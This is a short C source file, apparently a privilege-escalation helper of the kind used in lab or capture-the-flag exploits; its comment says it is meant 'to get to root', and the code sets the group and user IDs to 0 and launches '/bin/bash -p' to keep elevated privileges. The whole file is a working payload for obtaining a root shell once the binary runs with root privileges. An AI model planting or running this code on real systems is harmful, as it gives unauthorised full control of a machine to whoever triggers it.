/**
 * Here we only do something very simple to get to root.
 * First we set our Group ID and User ID,
 * Then we run /bin/bash to get into the shell.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
  
int main() {
  setgid(0);
  setuid(0);
  system("/bin/bash -p");

  return 0;
}
